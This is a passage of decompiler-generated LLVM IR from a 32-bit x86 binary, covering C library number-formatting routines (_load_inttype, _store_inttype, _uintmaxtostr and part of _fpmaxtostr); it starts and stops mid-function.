  uselistorder i32 %v1_8054aba, { 1, 0, 2 }
  uselistorder i32 %v0_8054acc, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_8054a70, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054a64, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i32 1024, { 0, 16, 4, 7, 6, 17, 5, 2, 3, 10, 9, 1, 11, 8, 13, 14, 15, 12 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054b05, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054aed, { 1, 0 }
  uselistorder label %dec_label_pc_8054a83, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8054b0c = icmp slt i32 %tmp5, 0
  %v3_8054b3d = and i32 %tmp4, 2048
  %v4_8054b3d = icmp eq i32 %v3_8054b3d, 0
  br i1 %v5_8054b0c, label %dec_label_pc_8054b3d, label %dec_label_pc_8054b1b

dec_label_pc_8054b1b:                             ; preds = %entry
  %v1_8054b1e = icmp eq i1 %v4_8054b3d, false
  br i1 %v1_8054b1e, label %dec_label_pc_8054b42, label %dec_label_pc_8054b20

dec_label_pc_8054b20:                             ; preds = %dec_label_pc_8054b1b
  %v6_8054b20 = icmp eq i32 %tmp4, 256
  %v1_8054b26 = inttoptr i32 %tmp to i32*
  %v2_8054b26 = load i32, i32* %v1_8054b26, align 4
  %v1_8054b28 = icmp eq i1 %v6_8054b20, false
  br i1 %v1_8054b28, label %dec_label_pc_8054b2f, label %dec_label_pc_8054b2a

dec_label_pc_8054b2a:                             ; preds = %dec_label_pc_8054b20
  %v1_8054b2a = urem i32 %v2_8054b26, 256
  br label %dec_label_pc_8054b3a

dec_label_pc_8054b2f:                             ; preds = %dec_label_pc_8054b20
  %v6_8054b2f = icmp eq i32 %tmp4, 512
  %v1_8054b35 = icmp eq i1 %v6_8054b2f, false
  br i1 %v1_8054b35, label %dec_label_pc_8054b3a, label %dec_label_pc_8054b37

dec_label_pc_8054b37:                             ; preds = %dec_label_pc_8054b2f
  %v1_8054b37 = urem i32 %v2_8054b26, 65536
  br label %dec_label_pc_8054b3a

dec_label_pc_8054b3a:                             ; preds = %dec_label_pc_8054b2f, %dec_label_pc_8054b2a, %dec_label_pc_8054b37
  %v0_8054b3c = phi i32 [ %v2_8054b26, %dec_label_pc_8054b2f ], [ %v1_8054b2a, %dec_label_pc_8054b2a ], [ %v1_8054b37, %dec_label_pc_8054b37 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8054b3c

dec_label_pc_8054b3d:                             ; preds = %entry
  br i1 %v4_8054b3d, label %dec_label_pc_8054b48, label %dec_label_pc_8054b42

dec_label_pc_8054b42:                             ; preds = %dec_label_pc_8054b3d, %dec_label_pc_8054b1b
  %v1_8054b42 = add i32 %tmp, 4
  %v2_8054b42 = inttoptr i32 %v1_8054b42 to i32*
  %v3_8054b42 = load i32, i32* %v2_8054b42, align 4
  store i32 %v3_8054b42, i32* @edx, align 4
  %v1_8054b45 = inttoptr i32 %tmp to i32*
  %v2_8054b45 = load i32, i32* %v1_8054b45, align 4
  ret i32 %v2_8054b45

dec_label_pc_8054b48:                             ; preds = %dec_label_pc_8054b3d
  %v6_8054b48 = icmp eq i32 %tmp4, 256
  %v1_8054b4e = inttoptr i32 %tmp to i32*
  %v2_8054b4e = load i32, i32* %v1_8054b4e, align 4
  %v1_8054b50 = icmp eq i1 %v6_8054b48, false
  br i1 %v1_8054b50, label %dec_label_pc_8054b57, label %dec_label_pc_8054b52

dec_label_pc_8054b52:                             ; preds = %dec_label_pc_8054b48
  %v1_8054b52 = mul i32 %v2_8054b4e, 16777216
  %v2_8054b52 = sdiv i32 %v1_8054b52, 16777216
  br label %dec_label_pc_8054b60

dec_label_pc_8054b57:                             ; preds = %dec_label_pc_8054b48
  %v6_8054b57 = icmp eq i32 %tmp4, 512
  %v1_8054b5d = icmp eq i1 %v6_8054b57, false
  br i1 %v1_8054b5d, label %dec_label_pc_8054b60, label %dec_label_pc_8054b5f

dec_label_pc_8054b5f:                             ; preds = %dec_label_pc_8054b57
  %v1_8054b5f = mul i32 %v2_8054b4e, 65536
  %v2_8054b5f = sdiv i32 %v1_8054b5f, 65536
  br label %dec_label_pc_8054b60

dec_label_pc_8054b60:                             ; preds = %dec_label_pc_8054b57, %dec_label_pc_8054b52, %dec_label_pc_8054b5f
  %v0_8054b60 = phi i32 [ %v2_8054b4e, %dec_label_pc_8054b57 ], [ %v2_8054b52, %dec_label_pc_8054b52 ], [ %v2_8054b5f, %dec_label_pc_8054b5f ]
  %v1_8054b60 = ashr i32 %v0_8054b60, 31
  store i32 %v1_8054b60, i32* @edx, align 4
  ret i32 %v0_8054b60

; uselistorder directives
  uselistorder i32 %v0_8054b60, { 1, 0 }
  uselistorder i32 %v2_8054b4e, { 2, 0, 1 }
  uselistorder i32 %v2_8054b26, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8054b60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054b3a, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8054b64 = load i32, i32* @ebx, align 4
  store i32 %v0_8054b64, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8054b69 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8054b69, i32* %ebx.global-to-local, align 4
  %v4_8054b6d = trunc i32 %tmp4 to i16
  %v6_8054b75 = icmp eq i32 %tmp6, 256
  %v1_8054b7b = icmp eq i1 %v6_8054b75, false
  br i1 %v1_8054b7b, label %dec_label_pc_8054b81, label %dec_label_pc_8054b7d

dec_label_pc_8054b7d:                             ; preds = %entry
  %v2_8054b7d = trunc i32 %tmp4 to i8
  %v4_8054b7d = bitcast i16* %tmp5 to i8*
  store i8 %v2_8054b7d, i8* %v4_8054b7d, align 1
  br label %dec_label_pc_8054b9f

dec_label_pc_8054b81:                             ; preds = %entry
  %v6_8054b81 = icmp eq i32 %tmp6, 2048
  %v1_8054b87 = icmp eq i1 %v6_8054b81, false
  br i1 %v1_8054b87, label %dec_label_pc_8054b90, label %dec_label_pc_8054b89

dec_label_pc_8054b89:                             ; preds = %dec_label_pc_8054b81
  %sext2 = mul i32 %tmp4, 65536
  %v1_8054b89 = sdiv i32 %sext2, 65536
  %v3_8054b89 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8054b89, i32* %v3_8054b89, align 4
  %v0_8054b8b = load i32, i32* %edx.global-to-local, align 4
  %v1_8054b8b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054b8b = add i32 %v1_8054b8b, 4
  %v3_8054b8b = inttoptr i32 %v2_8054b8b to i32*
  store i32 %v0_8054b8b, i32* %v3_8054b8b, align 4
  br label %dec_label_pc_8054b9f

dec_label_pc_8054b90:                             ; preds = %dec_label_pc_8054b81
  %v6_8054b90 = icmp eq i32 %tmp6, 512
  %v1_8054b96 = icmp eq i1 %v6_8054b90, false
  br i1 %v1_8054b96, label %dec_label_pc_8054b9d, label %dec_label_pc_8054b98

dec_label_pc_8054b98:                             ; preds = %dec_label_pc_8054b90
  store i16 %v4_8054b6d, i16* %tmp5, align 2
  br label %dec_label_pc_8054b9f

dec_label_pc_8054b9d:                             ; preds = %dec_label_pc_8054b90
  %sext3 = mul i32 %tmp4, 65536
  %v1_8054b9d = sdiv i32 %sext3, 65536
  %v3_8054b9d = bitcast i16* %tmp5 to i32*
  store i32 %v1_8054b9d, i32* %v3_8054b9d, align 4
  br label %dec_label_pc_8054b9f

dec_label_pc_8054b9f:                             ; preds = %dec_label_pc_8054b98, %dec_label_pc_8054b89, %dec_label_pc_8054b7d, %dec_label_pc_8054b9d
  %v2_8054b9f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054b9f, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8054ba0 = sdiv i32 %sext, 65536
  ret i32 %v1_8054ba0

; uselistorder directives
  uselistorder label %dec_label_pc_8054b9f, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8054baf = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054baf, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8054bbb = icmp slt i32 %arg4, 0
  %v1_8054bbd = icmp eq i1 %v2_8054bbb, false
  br i1 %v1_8054bbd, label %dec_label_pc_8054bde, label %dec_label_pc_8054bbf

dec_label_pc_8054bbf:                             ; preds = %entry
  %v1_8054bbf = sub i32 0, %arg4
  store i32 %v1_8054bbf, i32* %esi.global-to-local, align 4
  %v2_8054bc1 = icmp slt i32 %arg3, 0
  %v1_8054bc3 = icmp eq i1 %v2_8054bc1, false
  br i1 %v1_8054bc3, label %dec_label_pc_8054bde, label %dec_label_pc_8054bc5

dec_label_pc_8054bc5:                             ; preds = %dec_label_pc_8054bbf
  %v1_8054bc5 = sub i32 0, %arg2
  %v5_8054bc5 = icmp ne i32 %arg2, 0
  store i32 %v1_8054bc5, i32* %ecx.global-to-local, align 4
  %v2_8054bc7 = zext i1 %v5_8054bc5 to i32
  %v3_8054bc7 = add i32 %v2_8054bc7, %arg3
  %v1_8054bca = sub i32 0, %v3_8054bc7
  store i32 %v1_8054bca, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054bde

dec_label_pc_8054bde:                             ; preds = %entry, %dec_label_pc_8054bbf, %dec_label_pc_8054bc5
  %v0_8054be3 = phi i32 [ %v1_8054bbf, %dec_label_pc_8054bc5 ], [ %v1_8054bbf, %dec_label_pc_8054bbf ], [ %arg4, %entry ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_8054bc5 ], [ 0, %dec_label_pc_8054bbf ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8054be3
  %tmp30 = urem i32 -1, %v0_8054be3
  store i8 0, i8* %arg1, align 1
  %v1_8054be8 = add i32 %tmp30, 1
  %v1_8054be9 = load i32, i32* %esi.global-to-local, align 4
  %v12_8054be9 = icmp eq i32 %v1_8054be8, %v1_8054be9
  %v1_8054bf3 = icmp eq i1 %v12_8054be9, false
  br i1 %v1_8054bf3, label %dec_label_pc_8054c02, label %dec_label_pc_8054bf5

dec_label_pc_8054bf5:                             ; preds = %dec_label_pc_8054bde
  %v1_8054bf5 = add i32 %div, 1
  br label %dec_label_pc_8054c02

dec_label_pc_8054c02:                             ; preds = %dec_label_pc_8054bde, %dec_label_pc_8054bf5
  %stack_var_-20.0.off0 = phi i32 [ %v1_8054be8, %dec_label_pc_8054bde ], [ 0, %dec_label_pc_8054bf5 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8054bde ], [ %v1_8054bf5, %dec_label_pc_8054bf5 ]
  %v0_8054c02 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8054c02, i32* %ebp.global-to-local, align 4
  %v0_8054c04 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054c04, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054c08

dec_label_pc_8054c08:                             ; preds = %dec_label_pc_8054c56, %dec_label_pc_8054c02
  %v0_8054c3f = phi i32 [ %v0_8054c58, %dec_label_pc_8054c56 ], [ %v0_8054c02, %dec_label_pc_8054c02 ]
  %v0_8054c0c = phi i32 [ %v1_8054c5a, %dec_label_pc_8054c56 ], [ %v0_8054c04, %dec_label_pc_8054c02 ]
  %v1_8054c08 = icmp eq i32 %v0_8054c0c, 0
  br i1 %v1_8054c08, label %dec_label_pc_8054c3f, label %dec_label_pc_8054c0c

dec_label_pc_8054c0c:                             ; preds = %dec_label_pc_8054c08
  %v0_8054c10 = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_8054c0c, %v0_8054c10
  %tmp31 = urem i32 %v0_8054c0c, %v0_8054c10
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_8054c3f, %v0_8054c10
  %tmp32 = urem i32 %v0_8054c3f, %v0_8054c10
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_8054c23 = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_8054c27 = add i32 %tmp32, %v6_8054c23
  %v8_8054c2d = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_8054c32 = add i32 %div7, %v8_8054c2d
  store i32 %v2_8054c32, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_8054c27, %v0_8054c10
  %tmp33 = urem i32 %v2_8054c27, %v0_8054c10
  %v2_8054c3a = add i32 %div8, %v2_8054c32
  br label %dec_label_pc_8054c47

dec_label_pc_8054c3f:                             ; preds = %dec_label_pc_8054c08
  %v0_8054c43 = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_8054c3f, %v0_8054c43
  %tmp34 = urem i32 %v0_8054c3f, %v0_8054c43
  br label %dec_label_pc_8054c47

dec_label_pc_8054c47:                             ; preds = %dec_label_pc_8054c0c, %dec_label_pc_8054c3f
  %v13_8054c4d = phi i32 [ %tmp33, %dec_label_pc_8054c0c ], [ %tmp34, %dec_label_pc_8054c3f ]
  %storemerge = phi i32 [ %v2_8054c3a, %dec_label_pc_8054c0c ], [ %div10, %dec_label_pc_8054c3f ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8054c47 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054c47 = add i32 %v0_8054c47, -1
  store i32 %v1_8054c47, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_8054c4d, 10
  br i1 %tmp, label %dec_label_pc_8054c4d, label %dec_label_pc_8054c52

dec_label_pc_8054c4d:                             ; preds = %dec_label_pc_8054c47
  %v2_8054c4d = add i32 %v13_8054c4d, 48
  %v12_8054c4d = and i32 %v2_8054c4d, 255
  %v14_8054c4d = and i32 %v13_8054c4d, -256
  %v15_8054c4d = or i32 %v12_8054c4d, %v14_8054c4d
  br label %dec_label_pc_8054c56

dec_label_pc_8054c52:                             ; preds = %dec_label_pc_8054c47
  %v6_8054c52 = add i32 %v13_8054c4d, %arg5
  %v21_8054c52 = and i32 %v6_8054c52, 255
  %v23_8054c52 = and i32 %v13_8054c4d, -256
  %v24_8054c52 = or i32 %v21_8054c52, %v23_8054c52
  br label %dec_label_pc_8054c56

dec_label_pc_8054c56:                             ; preds = %dec_label_pc_8054c4d, %dec_label_pc_8054c52
  %storemerge9 = phi i32 [ %v15_8054c4d, %dec_label_pc_8054c4d ], [ %v24_8054c52, %dec_label_pc_8054c52 ]
  %v1_8054c56 = trunc i32 %storemerge9 to i8
  %v3_8054c56 = inttoptr i32 %v1_8054c47 to i8*
  store i8 %v1_8054c56, i8* %v3_8054c56, align 1
  %v0_8054c58 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054c5a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054c5a = or i32 %v1_8054c5a, %v0_8054c58
  %v3_8054c5a = icmp eq i32 %v2_8054c5a, 0
  %v1_8054c5c = icmp eq i1 %v3_8054c5a, false
  br i1 %v1_8054c5c, label %dec_label_pc_8054c08, label %dec_label_pc_8054c5e

dec_label_pc_8054c5e:                             ; preds = %dec_label_pc_8054c56
  %v4_8054c5e = icmp eq i32 %storemerge11, 0
  br i1 %v4_8054c5e, label %dec_label_pc_8054c69, label %dec_label_pc_8054c65

dec_label_pc_8054c65:                             ; preds = %dec_label_pc_8054c5e
  %v0_8054c65 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054c65 = add i32 %v0_8054c65, -1
  store i32 %v1_8054c65, i32* %edi.global-to-local, align 4
  %v1_8054c66 = inttoptr i32 %v1_8054c65 to i8*
  store i8 45, i8* %v1_8054c66, align 1
  br label %dec_label_pc_8054c69

dec_label_pc_8054c69:                             ; preds = %dec_label_pc_8054c5e, %dec_label_pc_8054c65
  %v0_8054c6c = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8054c6c

; uselistorder directives
  uselistorder i32 %v13_8054c4d, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8054c27, { 1, 0 }
  uselistorder i32 %v0_8054c10, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8054c0c, { 1, 0, 2 }
  uselistorder i32 %v0_8054c3f, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8054be8, { 1, 0 }
  uselistorder i32 %v0_8054be3, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054c69, { 1, 0 }
  uselistorder label %dec_label_pc_8054c56, { 1, 0 }
  uselistorder label %dec_label_pc_8054c47, { 1, 0 }
  uselistorder label %dec_label_pc_8054c02, { 1, 0 }
  uselistorder label %dec_label_pc_8054bde, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_5()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054c75 = load i32, i32* @edi, align 4
  %v0_8054c76 = load i32, i32* @esi, align 4
  %v0_8054c77 = load i32, i32* @ebx, align 4
  store i32 %v0_8054c77, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_8054c8c = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8054c8c = add i3 %v4_8054c8c, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_8054c8c, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8054c93 = add i32 %tmp156, 4
  %v2_8054c93 = inttoptr i32 %v1_8054c93 to i32*
  %v3_8054c93 = load i32, i32* %v2_8054c93, align 4
  store i32 %v3_8054c93, i32* %eax.global-to-local, align 4
  %v1_8054c9a = add i32 %tmp156, 8
  %v2_8054c9a = inttoptr i32 %v1_8054c9a to i8*
  %v3_8054c9a = load i8, i8* %v2_8054c9a, align 1
  %v4_8054c9a = zext i8 %v3_8054c9a to i32
  %v6_8054c9a = and i32 %v0_8054c77, -256
  %v7_8054c9a = or i32 %v4_8054c9a, %v6_8054c9a
  store i32 %v7_8054c9a, i32* %ebx.global-to-local, align 4
  %v1_8054c9d = inttoptr i32 %tmp156 to i32*
  %v2_8054c9d = load i32, i32* %v1_8054c9d, align 4
  store i32 %v2_8054c9d, i32* %ebp.global-to-local, align 4
  %v2_8054ca9 = or i8 %v3_8054c9a, 32
  %v7_8054ca9 = zext i8 %v2_8054ca9 to i32
  %v9_8054ca9 = and i32 %v3_8054c93, -256
  %v10_8054ca9 = or i32 %v7_8054ca9, %v9_8054ca9
  store i32 %v10_8054ca9, i32* %eax.global-to-local, align 4
  %v10_8054cab = icmp eq i8 %v2_8054ca9, 97
  %v1_8054cb1 = icmp eq i1 %v10_8054cab, false
  br i1 %v1_8054cb1, label %dec_label_pc_8054cba, label %dec_label_pc_8054cb3

dec_label_pc_8054cb3:                             ; preds = %entry
  %v2_8054cb3 = add i8 %v3_8054c9a, 6
  %v15_8054cb3 = zext i8 %v2_8054cb3 to i32
  %v18_8054cb3 = or i32 %v15_8054cb3, %v6_8054c9a
  store i32 %v18_8054cb3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054cba

dec_label_pc_8054cba:                             ; preds = %entry, %dec_label_pc_8054cb3
  %stack_var_-207.0 = phi i8 [ %v3_8054c9a, %entry ], [ %v2_8054cb3, %dec_label_pc_8054cb3 ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8054cc1 = icmp slt i32 %v2_8054c9d, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_8054cd0 = select i1 %v2_8054cc1, i32 6, i32 %v2_8054c9d
  store i32 %v3_8054cd0, i32* %ebp.global-to-local, align 4
  %v1_8054cd3 = add i32 %tmp156, 12
  %v2_8054cd3 = inttoptr i32 %v1_8054cd3 to i32*
  %v3_8054cd3 = load i32, i32* %v2_8054cd3, align 4
  store i32 %v3_8054cd3, i32* %eax.global-to-local, align 4
  %v2_8054cd6 = and i32 %v3_8054cd3, 2
  %v3_8054cd6 = icmp eq i32 %v2_8054cd6, 0
  br i1 %v3_8054cd6, label %dec_label_pc_8054ce4, label %dec_label_pc_8054cf0

dec_label_pc_8054ce4:                             ; preds = %dec_label_pc_8054cba
  %v2_8054ce4 = urem i32 %v3_8054cd3, 2
  %tmp192 = trunc i32 %v2_8054ce4 to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_8054cf0

dec_label_pc_8054cf0:                             ; preds = %dec_label_pc_8054ce4, %dec_label_pc_8054cba
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8054cba ], [ %tmp193, %dec_label_pc_8054ce4 ]
  %not.v5_8054cf0 = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_8054cf0, label %dec_label_pc_8054d67, label %dec_label_pc_8054d12

dec_label_pc_8054d12:                             ; preds = %dec_label_pc_8054cf0
  %v1_8054d12 = add i3 %v4_8054c8c, -2
  store i3 %v1_8054d12, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_8054d16 = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_8054d16, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_8054d12
  br label %dec_label_pc_8054da2

bb180:                                            ; preds = %dec_label_pc_8054d12
  %v5_8054d16 = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_8054d16, label %bb181, label %dec_label_pc_8054d1a

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_8054da2

dec_label_pc_8054d1a:                             ; preds = %bb180
  %not.v4_8054d14 = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_8054d14, label %dec_label_pc_8054da2, label %dec_label_pc_8054e37

dec_label_pc_8054d67:                             ; preds = %dec_label_pc_8054cf0
  store i3 %v4_8054c8c, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8054d6e = add i32 %tmp156, 16
  %v2_8054d6e = inttoptr i32 %v1_8054d6e to i32*
  store i32 32, i32* %v2_8054d6e, align 4
  %v4_8054d75 = add i8 %stack_var_-207.0, -96
  %v6_8054d75 = sub i8 95, %stack_var_-207.0
  %v7_8054d75 = and i8 %v6_8054d75, %stack_var_-207.0
  %v8_8054d75 = icmp slt i8 %v7_8054d75, 0
  %v9_8054d75 = icmp eq i8 %v4_8054d75, 0
  %v10_8054d75 = icmp slt i8 %v4_8054d75, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_8054d8a = icmp eq i1 %v10_8054d75, %v8_8054d75
  %v4_8054d8a = icmp eq i1 %v9_8054d75, false
  %v5_8054d8a = and i1 %v4_8054d8a, %v3_8054d8a
  br i1 %v5_8054d8a, label %dec_label_pc_8054d91, label %dec_label_pc_8054d8c

dec_label_pc_8054d8c:                             ; preds = %dec_label_pc_8054d67
  br label %dec_label_pc_8054d91

dec_label_pc_8054d91:                             ; preds = %dec_label_pc_8054d67, %dec_label_pc_8054d8c
  %v2_8054d99 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8054d99, i32* @ecx, align 4
  br label %dec_label_pc_8055162

dec_label_pc_8054da2:                             ; preds = %dec_label_pc_8054d1a, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_8054dbc = xor i3 %v4_8054c8c, -4
  store i3 %v3_8054dbc, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8054dc2

dec_label_pc_8054dc2:                             ; preds = %dec_label_pc_8054e13, %dec_label_pc_8054da2
  %v0_8054e13 = phi i32 [ 4096, %dec_label_pc_8054da2 ], [ %v2_8054e13, %dec_label_pc_8054e13 ]
  %v2_8054dc5 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8054da2 ], [ %v2_8054dc581, %dec_label_pc_8054e13 ]
  %v1_8054dfd = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8054da2 ], [ %v0_8054dc279, %dec_label_pc_8054e13 ]
  %v0_8054e0f66 = phi i32 [ 13, %dec_label_pc_8054da2 ], [ %v1_8054dc4, %dec_label_pc_8054e13 ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_8054da2 ], [ %stack_var_-220.1, %dec_label_pc_8054e13 ]
  %v1_8054dc4 = add i32 %v0_8054e0f66, -1
  %v4_8054dc5 = fcmp ule x86_fp80 %v1_8054dfd, %v2_8054dc5
  br i1 %v4_8054dc5, label %dec_label_pc_8054dec, label %dec_label_pc_8054dc9

dec_label_pc_8054dc9:                             ; preds = %dec_label_pc_8054dc2
  store x86_fp80 %v1_8054dfd, x86_fp80* %st0.global-to-local, align 4
  %v3_8054dcb = mul i32 %v1_8054dc4, 12
  store i32 %v3_8054dcb, i32* %eax.global-to-local, align 4
  %v1_8054dce = add i32 %v3_8054dcb, ptrtoint (x86_fp80** @global_var_80616a0.783 to i32)
  %v2_8054dce = inttoptr i32 %v1_8054dce to x86_fp80*
  %v3_8054dce = load x86_fp80, x86_fp80* %v2_8054dce, align 4
  %v4_8054dd4 = fmul x86_fp80 %v1_8054dfd, %v3_8054dce
  store x86_fp80 %v4_8054dd4, x86_fp80* %st1.global-to-local, align 4
  %v4_8054dd8 = fcmp ule x86_fp80 %v4_8054dd4, %v3_8054dce
  br i1 %v4_8054dd8, label %dec_label_pc_8054e0d, label %dec_label_pc_8054ddc

dec_label_pc_8054ddc:                             ; preds = %dec_label_pc_8054dc9
  store x86_fp80 %v4_8054dd4, x86_fp80* %st1.global-to-local, align 4
  %v5_8054de6 = sub i32 %stack_var_-220.0, %v0_8054e13
  br label %dec_label_pc_8054e0f

dec_label_pc_8054dec:                             ; preds = %dec_label_pc_8054dc2
  %v3_8054dec = mul i32 %v1_8054dc4, 12
  store i32 %v3_8054dec, i32* %eax.global-to-local, align 4
  %v1_8054def = add i32 %v3_8054dec, ptrtoint (x86_fp80** @global_var_80616a0.783 to i32)
  %v2_8054def = inttoptr i32 %v1_8054def to x86_fp80*
  %v3_8054def = load x86_fp80, x86_fp80* %v2_8054def, align 4
  %v4_8054df5 = fdiv x86_fp80 %v3_8054def, %v1_8054dfd
  store x86_fp80 %v4_8054df5, x86_fp80* %st1.global-to-local, align 4
  %v4_8054df7 = fcmp ogt x86_fp80 %v3_8054def, %v1_8054dfd
  br i1 %v4_8054df7, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_8054dec
  store x86_fp80 %v3_8054def, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8054dfd

bb183:                                            ; preds = %dec_label_pc_8054dec
  %v5_8054df7 = fcmp olt x86_fp80 %v3_8054def, %v1_8054dfd
  br i1 %v5_8054df7, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_8054def, x86_fp80* %st1.global-to-local, align 4
